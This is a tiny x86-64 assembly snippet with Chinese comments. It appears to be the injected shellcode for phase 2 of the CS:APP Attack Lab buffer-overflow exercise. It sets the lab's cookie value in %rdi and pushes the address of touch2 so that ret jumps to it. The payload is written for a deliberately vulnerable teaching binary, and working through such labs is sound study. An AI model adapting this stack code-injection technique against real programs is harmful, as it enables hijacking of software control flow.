movq    $0x59b997fa, %rdi	#cookie的值是题目所给(在第一题的结果中)
pushq   0x4017ec	# touch2的首地址入栈,那么ret就去touch2去执行
ret
